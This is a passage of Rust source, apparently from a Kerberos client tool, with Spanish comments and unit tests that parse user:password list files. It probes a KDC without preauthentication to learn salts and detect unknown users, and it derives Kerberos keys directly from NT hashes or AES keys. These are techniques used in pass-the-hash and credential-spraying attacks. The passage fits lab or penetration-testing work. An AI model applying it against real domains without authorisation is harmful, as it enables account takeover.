fn learn_salt(c: &KdcConnection, user: &str, realm: &str) -> Result<String, String> {
    let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96];
    match charon_client::probe_as_no_preauth(c, user, realm, &etypes).map_err(|e| e.to_string())? {
        charon_client::AsProbe::PreauthRequired { salts, .. } => {
            match salts.iter().find(|s| s.etype == etype_mod::AES256_CTS_HMAC_SHA1_96) {
                Some(s) if s.salt.is_some() => Ok(String::from_utf8_lossy(s.salt.as_ref().unwrap()).into_owned()),
                _ => Ok(format!("{realm}{user}")), // construcción estándar como fallback documentado
            }
        }
        charon_client::AsProbe::NoPreauth { .. } => Ok(format!("{realm}{user}")),
        other => Err(format!("no pude aprender el salt de {user}: {}", other_desc_probe(&other))),
    }
}

fn other_desc_probe(p: &charon_client::AsProbe) -> String {
    match p {
        charon_client::AsProbe::PreauthRequired { .. } => "preauth requerido".into(),
        charon_client::AsProbe::NoPreauth { .. } => "sin preauth".into(),
        charon_client::AsProbe::PrincipalUnknown { .. } => "usuario inexistente".into(),
        charon_client::AsProbe::PreauthFailed { .. } => "preauth fallido".into(),
        charon_client::AsProbe::Error { code, e_text, .. } => format!("error {code} {e_text:?}"),
    }
}

/// Clave a partir de contraseña (AES con salt aprendido) o hashes.
#[allow(clippy::too_many_arguments)]
fn key_from_credentials(
    _user: &str,
    _realm: &str,
    _salt: &str,
    password: &str,
    nt_hash: Option<&str>,
    aes_key: Option<&str>,
) -> Result<KerberosKey, String> {
    if let Some(h) = nt_hash {
        let b = decode_hex(h)?;
        return KerberosKey::from_raw(etype_mod::RC4_HMAC, &b).map_err(|e| e.to_string());
    }
    if let Some(h) = aes_key {
        let b = decode_hex(h)?;
        let et = match b.len() {
            16 => etype_mod::AES128_CTS_HMAC_SHA1_96,
            32 => etype_mod::AES256_CTS_HMAC_SHA1_96,
            n => return Err(format!("clave AES de {n} bytes: deben ser 16 o 32")),
        };
        return KerberosKey::from_raw(et, &b).map_err(|e| e.to_string());
    }
    // TGT con AES256: la contraseña nunca viaja por el cable, solo el
    // preauth cifrado.
    KerberosKey::from_password(password, _salt, etype_mod::AES256_CTS_HMAC_SHA1_96).map_err(|e| e.to_string())
}

fn decode_hex(s: &str) -> Result<Vec<u8>, String> {
    hex::decode(s.trim()).map_err(|e| format!("hex inválido ({e}): se esperaba una cadena par de dígitos hex"))
}

fn etype_name(id: i32) -> &'static str {
    match id {
        18 => "AES256-CTS-HMAC-SHA1-96",
        17 => "AES128-CTS-HMAC-SHA1-96",
        23 => "RC4-HMAC",
        _ => "desconocido",
    }
}

/// Silencia el warning de funciones de resultado aún no usadas en rutas JSON.
#[allow(dead_code)]
fn _ensure_stdout_flushed() {
    let _ = std::io::stdout().flush();
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp_file(name: &str, content: &str) -> String {
        let path = std::env::temp_dir().join(name);
        std::fs::write(&path, content).unwrap();
        path.to_str().unwrap().to_string()
    }

    #[test]
    fn resolve_pairs_acepta_comentarios_dos_puntos_en_clave_y_crlf() {
        let path = tmp_file(
            "charon-test-pairs-ok.txt",
            "# lista del lab\r\njdoe:Jdoe!Pass42\r\naesuser:con:dos:ultimos\n\n  legacy:  con espacios  \n",
        );
        let pairs = resolve_pairs(&path).unwrap();
        assert_eq!(
            pairs,
            vec![
                ("jdoe".to_string(), "Jdoe!Pass42".to_string()),
                ("aesuser".to_string(), "con:dos:ultimos".to_string()),
                ("legacy".to_string(), "con espacios".to_string()),
            ]
        );
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn resolve_pairs_falla_con_numero_de_linea_si_faltan_los_dos_puntos() {
        let path = tmp_file("charon-test-pairs-mal.txt", "jdoe:buena\nlinea-rompida\n");
        let err = resolve_pairs(&path).unwrap_err();
        assert!(err.contains("línea 2"), "debe señalar la línea concreta: {err}");
        std::fs::remove_file(&path).ok();
    }

    #[test]
    fn resolve_pairs_rechaza_usuario_o_contrasena_vacios() {
        let path = tmp_file("charon-test-pairs-vacios.txt", "jdoe:buena\n:sin-usuario\n");
        let err = resolve_pairs(&path).unwrap_err();
        assert!(err.contains("línea 2") && err.contains("usuario vacío"), "{err}");

        let path2 = tmp_file("charon-test-pairs-vacios2.txt", "jdoe:\n");
        let err2 = resolve_pairs(&path2).unwrap_err();
        assert!(err2.contains("contraseña vacía"), "{err2}");

        std::fs::remove_file(&path).ok();
        std::fs::remove_file(&path2).ok();
    }
}
